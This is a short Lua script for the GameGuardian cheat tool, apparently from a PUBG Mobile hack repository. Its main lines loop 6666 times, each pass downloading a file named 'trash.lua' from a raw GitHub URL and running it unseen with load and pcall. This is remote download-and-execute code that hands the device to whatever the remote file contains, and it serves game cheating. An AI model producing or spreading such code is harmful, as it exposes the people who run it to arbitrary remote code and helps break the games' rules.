gg.getResults(99999)
for i = 1,6666 do local trash = gg.makeRequest('https://raw.githubusercontent.com/redstarksten/pubgmhack/master/trash.lua').content
pcall(load(trash))
end